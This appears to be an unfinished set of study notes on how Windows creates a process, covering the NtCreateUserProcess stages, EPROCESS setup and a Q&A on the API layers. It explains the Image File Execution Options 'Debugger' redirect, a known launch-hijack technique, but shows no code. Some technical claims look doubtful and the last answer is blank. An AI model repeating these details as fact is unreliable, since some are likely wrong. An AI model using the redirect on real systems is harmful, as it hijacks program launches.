Now that `NtCreateUserProcess` has found a valid Windows executable image, kernel extract jsut the name, and before load it, did anyone set up a special rule for this program?
Then it looks under:
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options` if the developer or any tool created that key, Windows sees the full path stub in the Debugger value, it restarts the whole load process but this time for the stub instead of the original.
It works like a call-forward for EXEs, unless is explicitly set that registry key, nothing happens to the original program, it runs as normal, but as soon as a IEFO "Debugger" entry, any attempt to launch that .exe will ring through the stub first.
Check more in the POC.

![Diagram of the Create User Process flow part 1](/images/articles/create_user_process.png)
![Diagram of the Create User Process flow part 2](/images/articles/create_user_process2.png)

**Stage 3: Creating Windows Executive process object**
`NtCreateUserProcess` has opened a valid Windows executable and created a section object map into the new process memory space, next, creates Windows executive process object, creating the executive process object, that involves

- Setting up `EPROCESS` object
- Initial process address space
- Initial `KPROCESS`
- Setting up `PEB`
  Build EPROCESS structure
  kernel fills out the process record, lives entirely in kernel memory
- CPU affinity I/O and memory priorities, working set limits, token rights, etc, all inherit from parents, unless is explicitly override.
- WOW64 support, if launches a 32-bit process on 64-bit Windows, an auxiliary WOW structure is filled.
- New process gets a copy token of the parent's security token.

**Stage 4: Creating the initial thread and its stack context**

### Cues

**Q**: In the Windows client side what is `CreateProcessInternalW`? Is the same as normal `CreateProcess`?
**R:** They are related, `CreateProcess*` functions are the "higher-level" part, a documented part where the developer can use. And the `CreateProcessInternalW`(exported by `Kernel32.dll`) is a "under-the-hood" API that invokes the native system call `NtCreateUserProcess` in `Ntdll.dll`, it's undocumented, and this is where the parameters and all of the `CreateProcess*` goes to, so it can convert into native(kernel) and do the heavy lifting to build the process and initial thread(along side with `csrss`)

**Q:** What is the relationship or even hierarchy of Ntdll.dll, Kernel32.dll, NtCreateUserProcess?
**R:**

```
[Your EXE]
    ↓ CreateProcessW
[Kernel32.dll]
    ↓ CreateProcessInternalW
[Ntdll.dll]
    ↓ NtCreateUserProcess (syscall)
[ntoskrnl.exe / Executive → PsCreateSystemProcess, CSRSS, …]
```

Before reaching kernel mode, the process creation flow has 3 layers before

```
Win32 (Kernel32.dll) → Native API stub (Ntdll.dll) → Syscall (NtCreateUserProcess) → Kernel
```

**Q:** What is a executive process object? is a process that other subsystems can use?
**R:** Executive process object is the Kernel internal representation of a process, think of like a object that the kernel creates and maintains for every running process, other subsystems like (CSRSS, debuggers, drivers) refer to and manipulate to this same object when they need.

Each process is represented by a `EPROCESS` structure in kernel memory, under the hood, every process you see in user mode is simply an opaque reference to this kernel executive object

```
CreateProcessW (user call)
    ↓
CreateProcessInternalW (Kernel32.dll)
    ↓
NtCreateUserProcess (Ntdll.dll / Native API stub)
    ↓
Executive (PsCreateSystemProcess → allocates EPROCESS)
    ↓
Object Manager publishes a handle to that EPROCESS
```

**Q:** What it means to perform post creation windows subsystem specific process initialization?
**R:** This is the work done after the kernel has created the initial thread and the raw process, but before the program actually is running, before the entry point of the code, Windows hands the process to the subsystem, like GUI subsystem, or the console subsystem.

**Q:** What is a modern process?
**R:** It's not just a normal program running, it's a full rich kernel managed object, provides its own virtual address space so no ones process can't read/write(normally) another memory, security tokens, threads, PEB, and many more.

**Q:** What is CSRSS?
**R:** Stands for Client/Server Runtime Subsystem, it creates and manages console windows. It runs as SYSTEM in Session 0.

**Q:** What is a section object map?
**R:** Kernel way of representing a piece of memory that can be shared or mapped with other processes, this is what you get when a section is mapped into a process's virtual memory address space.

**Q:** What is the difference of a process and a thread, why a process can't run without a thread? It's vice versa?
**R:**

### Summary
